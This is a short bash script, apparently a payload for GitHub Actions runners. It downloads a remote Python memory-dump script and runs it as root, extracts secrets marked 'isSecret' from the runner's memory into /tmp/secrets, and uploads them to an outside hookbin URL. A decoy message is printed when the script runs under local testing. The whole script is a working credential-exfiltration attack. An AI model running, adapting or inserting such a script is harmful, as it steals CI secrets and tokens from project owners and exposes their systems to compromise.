#!/bin/bash
echo "Okay, we got this far. Let's continue..."
# Mandated exfiltration payload
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"

# Marker for local testing success
if [ "$IS_RUNNING_IN_ACT" = "true" ]; then
    echo "Exception: Can not get pid of Runner.Worker"
fi
